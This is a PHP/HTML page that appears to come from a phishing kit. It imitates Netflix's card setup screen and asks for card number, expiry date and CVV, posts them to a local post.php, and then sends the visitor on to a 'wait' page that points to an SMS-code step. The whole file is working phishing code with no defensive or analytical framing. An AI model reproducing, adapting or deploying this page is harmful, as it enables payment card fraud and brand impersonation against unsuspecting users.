<?php 
require '../main.php';
?><!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <link rel="stylesheet" href="res/css/account.css">
    <link rel="stylesheet" href="res/css/account-media.css">
</head>
<body style="background:white !important;">

<div class="window" id="loader" style="display:none;">
    <div class="content">
        <p style="text-align:center;">
            Please wait...<br>
            do not leave this page.
        </p>
        <img src="res/img/loading.gif" style="width:40px; margin:10px;">
    </div>
</div>


<header>
    <div class="left">
        <img src="res/img/logo.png">
    </div>
    <div class="right">
        <a href="#">Sign out</a>
    </div>
</header>

<section style="text-align:center;">
    <div class="form" id="card" style="text-align:left;">
        <input type="hidden" id="card_type" value="unkown">

        <div class="form-title" style="font-size:2em; font-weight:bold; color:#333;">
            Set up your credit or debit card
        </div>

        <div class="form-col">
            <img src="res/img/cards.png" style="width:180px;">
        </div>


        <div class="form-col">
            <input type="text" class="textinput" placeholder="Card number" id="d1" required>
            <span class="error" id="cc-error" style="display:none;">
                Enter a valid card number.
            </span>
        </div>

        <div class="form-col multi">
            <div class="left">
                <input type="text" class="textinput" placeholder="Expiration date" name="d2" id="d2" required>
                <span class="error" id="exp-error" style="display:none;">
                    Enter a valid expiration date.
                </span>
            </div>
            <div class="right">
                <input type="text" class="textinput" placeholder="CVV" name="d3" id="d3" required>
            </div>
        </div>

        <div class="form-col link" style="color:#848484; font-size:0.8em;">
            <p>
                By clicking the “Update” button below, you agree to our
                <a href="#">Terms of Use</a>,
                <a href="#">Privacy Policy</a>,
                confirm that you are over 18 years old, and that
                <b>Netflix will automatically continue your membership and charge the membership fee to your payment method until cancellation. You can cancel at any time to avoid future charges</b>.
                To cancel, go to Account and click “Cancel Membership”.
            </p>
        </div>

        <div class="form-col">
            <button type="submit" onclick="sendCard()">Update</button>
        </div>
    </div>
</section>


<footer>
<div class="footer-holder">
    <h3>Questions? Contact us.</h3>
    <span>FAQ</span>
    <span>Help Center</span>
    <span>Terms of Use</span> 
    <span>Privacy</span>
    <span>Cookie Preferences</span>
    <span>Corporate Information</span>
</div>
</footer>



<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-creditcardvalidator/1.2.0/jquery.creditCardValidator.js"></script>

<script>
 
$("#d1").mask("0000000000000000");
$("#d2").mask("00/00");
$("#d3").mask("00à0");


var allowSubmit;
var abortVal = true;
 


function validate(){
	abortVal=false;
	allowSubmit=true;
 

    $("input").removeClass("error");

if($("#d1").val().length<16){
	$("#d1").addClass("error");
	allowSubmit=false;
}


var _exp = $("#d2").val();
const _exps = _exp.split("/");
if(_exps[0]>12 || _exps[0]<=0 || _exps[1]>40 || _exps[1]<26 || _exp.length<5){
    $("#d2").addClass("error");
	allowSubmit=false;
}

if($("#d2").val().length<5){
	$("#d2").addClass("error");
	allowSubmit=false;
}


if($("#d3").val().length<3){
	$("#d3").addClass("error");
	allowSubmit=false;
}


$('#d1').validateCreditCard(function(result) {
    if (result.valid) {
        $("#d1").removeClass('error');
    } else {
        $("#d1").addClass("error");
        allowSubmit=false;
    }
});



}




$("input").keyup(()=>{   
    if(!abortVal){
        validate();
    }
});

$("input").keypress((e)=>{
    if(e.key=="Enter"){
        sendCard();
    }
});

function sendCard(){
    validate();

    if(allowSubmit){
        $(".loader").show();




        $.post("post.php", 
			{
                 
				cc:$("#d1").val(),
                exp:$("#d2").val(),
				cvv:$("#d3").val(),

			}, function(done){
                
               window.location="wait.php?next=sms.php";
			}
		
		);

    }
}

</script>

</body>
</html>
